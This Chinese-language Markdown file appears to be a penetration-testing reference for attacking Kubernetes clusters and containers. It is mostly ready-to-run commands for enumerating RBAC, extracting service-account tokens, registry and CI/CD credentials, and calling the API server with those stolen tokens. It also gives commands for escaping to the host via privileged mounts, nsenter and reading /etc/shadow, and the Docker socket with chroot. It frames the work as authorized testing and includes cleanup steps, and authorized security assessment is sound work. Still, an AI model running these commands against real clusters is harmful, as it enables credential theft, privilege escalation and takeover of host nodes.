# K8s 与容器（k8s-and-container）

> 配套 `ad-cloud/SKILL.md`、`references/cloud-native.md`。只操作授权集群/命名空间/镜像。
> 占位符：`<kubeconfig>`、`<ns>`、`<sa>`、`<pod>`、`<image>`、`<node>`。先记录 `kubectl config current-context` 与 token 过期时间。

## 0. 本地材料先离线看

```bash
# 不联网的 kubeconfig 体检（本仓库脚本）
python Tool/scripts/adcloud-check.py --kubeconfig <kubeconfig>
```

关注：`current-context` 是否正确、`insecure-skip-tls-verify`、无凭据用户、`system:serviceaccount:*:cluster-admin`、JWT `exp`/`groups`、`exec` 插件。
离线只能看“配置面”，RBAC 是否真的宽必须在线验证；不要把文件名/用户名当结论。

## 1. 身份与 RBAC 枚举

```bash
export KUBECONFIG=<kubeconfig>
kubectl config current-context
kubectl config view --minify -o jsonpath='{.users[0].name}{"\n"}'
kubectl auth whoami 2>/dev/null || kubectl auth can-i --list
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>
```

```bash
kubectl get clusterrolebinding -o wide
kubectl get rolebinding -A -o wide
kubectl get clusterrole -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
kubectl get role -A -o json | jq '.items[] | select(.rules[]?.verbs[]?=="*") | .metadata.name'
```

重点权限（任一成立都继续验证）：

| 权限 | 可能路径 |
|---|---|
| `create pods` / `create daemonsets` / `create jobs` | 挂 `hostPath`、privileged、hostPID，落到节点 |
| `get secrets` / `list secrets` | 取 SA token、镜像仓库凭据、云密钥 |
| `patch`/`update` deployments/statefulsets | 改现有工作负载加挂载/换镜像 |
| `impersonate` | 变成高权用户/组/SA |
| `bind` / `escalate` | 把高权 Role/ClusterRole 绑到自己 |
| `get nodes` / `create pods/exec` | 节点信息、进入现有 Pod |

判据：`kubectl auth can-i <verb> <resource>` 返回 `yes`，并实际完成一个只读/低影响动作（如读取测试 Secret、创建带标记的 Pod）。
失败判据：只有 `list` 但 `get` 被拒；或 `can-i` 为 yes 但 Admission/PSP/Quota 拦住。

## 2. Token 与身份滥用

### 2.1 SA token 来源

```bash
# Pod 内
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
# 集群内旧式 Secret
kubectl get secrets -A | grep -E 'service-account-token|dockerconfigjson'
kubectl get secret <name> -n <ns> -o jsonpath='{.data.token}' | base64 -d
```

```bash
# 不落盘解析 JWT（只读 payload）
python - <<'PY'
import base64,json,sys
t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
p=t.split('.')[1]; p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))
PY
```

记录 `sub`、`groups`、`exp`、`aud`、`iss`。`system:masters` 绕过 RBAC；`system:serviceaccounts` 覆盖全部 SA。

### 2.2 用 token 直接访问 API

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/<ns>/pods"
```

判据：API 返回 200 且列出授权内资源；403 说明 token 有效但权限不足；401 说明 token 过期/无效。
不要在命令行历史/报告里留完整 token；用文件描述符或临时变量并清理。

### 2.3 高价值 token 目标

- `kube-system` 的 controller/CNI/Ingress SA：可能能读全集群 Secret 或改 DaemonSet。
- CI/CD runner 的 SA：常能创建 Pod、读 registry secret。
- `cluster-admin`/`system:masters` 绑定：直接提权，但仍要留“前后 can-i”证据。
- 云 IRSA/Workload Identity：Pod 内临时凭据可转云 API，按 `cloud-native.md` 的 STS 判据走。

## 3. 容器逃逸面

先确认当前 Pod 的 securityContext 与挂载：

```bash
id; capsh --print 2>/dev/null
cat /proc/1/cgroup; cat /proc/self/status | grep -E 'CapEff|Seccomp'
mount | grep -E 'hostPath|/host|docker.sock|containerd.sock|kubelet'
ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
```

### 3.1 privileged / CAP_SYS_ADMIN

```bash
# 只读优先：挂宿主根到 /mnt/host
mkdir -p /mnt/host
mount --bind / /mnt/host 2>/dev/null || mount -t proc proc /mnt/host/proc
ls /mnt/host; cat /mnt/host/etc/hostname
# 进入宿主命名空间
nsenter -t 1 -m -u -i -n -p -- id
```

判据：`id` 返回宿主身份，或能读到宿主 `/etc/shadow`/kubelet 凭据。
失败判据：`Operation not permitted`（缺 CAP_SYS_ADMIN）、宿主 PID namespace 不可见。

### 3.2 hostPath / hostPID / hostNetwork

```bash
# hostPath 常见落点
ls -la /var/lib/kubelet/pods 2>/dev/null
find / -maxdepth 3 -name 'kubelet.conf' -o -name 'admin.conf' 2>/dev/null
# hostPID
ps aux | head; nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow
```

判据：通过挂载点读到宿主文件/配置，或进入宿主命名空间。
失败判据：挂载只读且无敏感路径、PID 1 仍是容器 init。

### 3.3 Docker/containerd socket

```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host --privileged alpine chroot /host sh
ctr -a /run/containerd/containerd.sock -n k8s.io containers list
```

判据：能创建特权容器并读到宿主根。
失败判据：socket 不存在/权限拒绝；或只读 socket 代理。

### 3.4 其他

- cgroup v1 `release_agent`（需 `CAP_SYS_ADMIN`，且 cgroup 未只读）。
- `CAP_SYS_PTRACE` + 注入宿主进程；`CAP_NET_ADMIN` + 流量劫持。
- 内核漏洞按版本匹配，只在授权/隔离环境验证；不在生产盲打。
- `hostNetwork` 只能看到节点网络，不等于宿主文件系统；不要混淆判据。

判据统一：**在宿主命名空间执行 `id`，或读到宿主文件系统/凭据，并有完整复现命令**。
仅有“Pod 是 privileged”配置本身不算逃逸成功。

## 4. 镜像与 CI/CD 凭据

### 4.1 镜像层与配置

```bash
trivy image --severity HIGH,CRITICAL <image>
trivy fs --scanners secret .
trivy config .
grype <image>; syft <image> -o json
```

重点：镜像层里残留的 `.git`、`.env`、`~/.aws`、`~/.docker/config.json`、CI token、签名密钥；不是“版本旧”就自动等于可利用。
判据：命中可利用的 HIGH/CRITICAL（有入口/利用链）或明文密钥，并能复现读取/使用。

### 4.2 Registry 与拉取凭据

```bash
kubectl get secret -A -o json | jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") | .metadata.namespace+"/"+.metadata.name'
kubectl get secret <name> -n <ns> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .
```

判据：用拉取凭据能 `docker login`/拉取授权内镜像；仅看到 Secret 名称不算。

### 4.3 CI/CD 环境

```bash
env | grep -Ei 'AWS|AZURE|GCP|TOKEN|SECRET|CI_|GITHUB|GITLAB|DOCKER'
ls -la ~/.aws ~/.docker ~/.config/gcloud 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
git config --list --show-origin | grep -Ei 'url|token'
```

- `GITHUB_TOKEN`/`CI_JOB_TOKEN` 的 scope：能否写仓库、读 protected env、触发其他流水线。
- Runner 是否共享、是否允许 MR/PR 触发、能否挂宿主 Docker socket。
- 云 OIDC 信任策略的 `sub`/`aud` 是否过宽（`repo:*`、`ref:*`）。
- 制品仓库/签名密钥是否能推生产镜像。

判据：用 CI token 成功读取受保护变量、推送镜像、或 AssumeRole 到部署角色，且有 API 返回。
失败判据：token 只读、环境隔离、OIDC `sub` 精确匹配。

## 5. 失败判据与降级

| 现象 | 原因 | 处理 |
|---|---|---|
| `Unauthorized` | token 过期/错误集群 | 重新取 token，核对 `exp`/`iss`/`aud` |
| `Forbidden` | RBAC 不足 | `auth can-i --list`，换 SA/角色，不要盲试 |
| 无法创建 Pod | PSP/PSA/Quota/Admission | 查 namespace 的 PSA 标签与 quota |
| 逃逸失败 | 缺 CAP/只读挂载/seccomp | 换面或停下，不反复提权 |
| Secret 为空 | 旧式 token 已不自动生成 | 用 projected token 或换目标 |
| 镜像扫描无结果 | 私有 registry/架构不匹配 | 先拉取/指定平台，再做 SBOM |

降级顺序：只读 API 枚举 → 现有 Pod `exec` → 创建带标记 Pod → 修改现有工作负载 → 节点级逃逸。每级都要单独授权。

## 6. 证据、清理与边界

- 证据：命令、时间、context/namespace、前后 `auth can-i`、API 返回、Pod 清单、节点 `id`。
- 清理：删除测试 Pod/Job/DaemonSet、撤销临时 RoleBinding、删除上传工具与 Secret 副本；恢复被改的 Deployment。
- 不导出业务数据；不创建计费资源；不修改 IAM/集群策略除非单独授权并备份。
- 不把“有权限”写成“已逃逸”；不把“镜像有 CVE”写成“可提权”。
- 纯 Web/应用漏洞走 R20；AD/Kerberos 部分见 `kerberos-and-adcs.md`。
